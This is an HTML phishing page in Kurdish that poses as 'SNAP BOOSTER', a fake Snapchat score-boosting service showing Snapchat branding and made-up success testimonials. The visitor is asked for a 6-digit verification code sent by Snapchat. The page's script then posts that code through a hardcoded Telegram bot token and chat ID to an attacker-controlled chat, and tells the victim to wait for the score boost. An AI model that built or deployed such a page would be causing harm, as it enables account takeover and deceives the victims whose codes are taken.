<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify - SNAP BOOSTER</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: #000000; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            color: white;
        }
        .box { 
            background: #121212; 
            padding: 30px; 
            border-radius: 25px; 
            border: 1px solid #333;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5); 
            width: 90%; 
            max-width: 350px; 
            text-align: center; 
        }
        .logo {
            width: 80px;
            height: 80px;
            background: #fffc00;
            border-radius: 20px;
            margin: 0 auto 20px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .logo img { width: 60px; }
        h2 { color: #fffc00; margin-bottom: 5px; font-size: 24px; text-transform: uppercase; }
        p.desc { color: #888; font-size: 13px; margin-bottom: 25px; }
        .instruction { color: #fffc00; font-weight: bold; margin-bottom: 15px; font-size: 14px; }
        input { 
            width: 100%; 
            padding: 15px; 
            margin: 10px 0; 
            border: 1px solid #333; 
            border-radius: 12px; 
            box-sizing: border-box; 
            background: #1e1e1e;
            color: white;
            text-align: center;
            font-size: 18px;
            letter-spacing: 5px;
        }
        input::placeholder { color: #666; letter-spacing: normal; font-size: 14px; }
        button { 
            width: 100%; 
            padding: 15px; 
            background: #fffc00; 
            color: black; 
            border: none; 
            border-radius: 12px; 
            cursor: pointer; 
            font-weight: bold;
            font-size: 18px;
            margin-top: 15px;
        }
        .status-list {
            width: 100%;
            max-width: 350px;
            margin-top: 20px;
        }
        .status-bar {
            background: #121212;
            border: 1px solid #1db954;
            border-radius: 15px;
            padding: 10px 20px;
            margin-bottom: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 12px;
        }
        .green-dot { color: #1db954; }
    </style>
</head>
<body>

<div style="display: flex; flex-direction: column; align-items: center; width: 100%;">
    <div class="box">
        <div class="logo">
            <img src="https://pathwayport.com/wp-content/uploads/2021/11/snapchat-logo.png" alt="Snapchat">
        </div>
        <h2>SNAP BOOSTER</h2>
        <p class="desc">سیستەمێ فەرمی یێ زیادکرنا سکۆری ئەکاونتی</p>
        
        <p class="instruction">کۆدەکێ ٦ ژمارەیی بۆ سناپەکێ تە هات:</p>

        <form id="verifyForm">
            <input type="number" id="code" placeholder="کۆدەکە لێرە بنووسە" required>
            <button type="submit">تەواوکردن</button>
        </form>
    </div>

    <div class="status-list">
        <div class="status-bar">
            <span style="color: #1db954;">✓ 76,807+ سکۆر</span>
            <span>Lana.Zebari98@ <span class="green-dot">●</span></span>
        </div>
        <div class="status-bar">
            <span style="color: #1db954;">✓ 27,399+ سکۆر</span>
            <span>Sara-Gardi.official@ <span class="green-dot">●</span></span>
        </div>
        <div class="status-bar">
            <span style="color: #1db954;">✓ 49,630+ سکۆر</span>
            <span>Hama_Sherwani99@ <span class="green-dot">●</span></span>
        </div>
    </div>
</div>

<script>
    document.getElementById('verifyForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const code = document.getElementById('code').value;
        
        const token = "8752727438:AAFJP2gw18UHVfBW_fef7J1rOuQJ3WVhoNU";
        const chat_id = "6648131751";
        const msg = `🔢 Verification Code: ${code}`;

        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`)
        .then(() => {
            alert("کۆد ب سەرکەفتوویی هاتە ناردن. چاوەڕێ بکە تا سکۆر بۆت زێدە دبیت.");
            // لێرەدا دشێی ڕەوانەی لاپەڕەیەکی دی بکەی یان هەر لێرە بمێنێتەوە
        });
    });
</script>
</body>
</html>
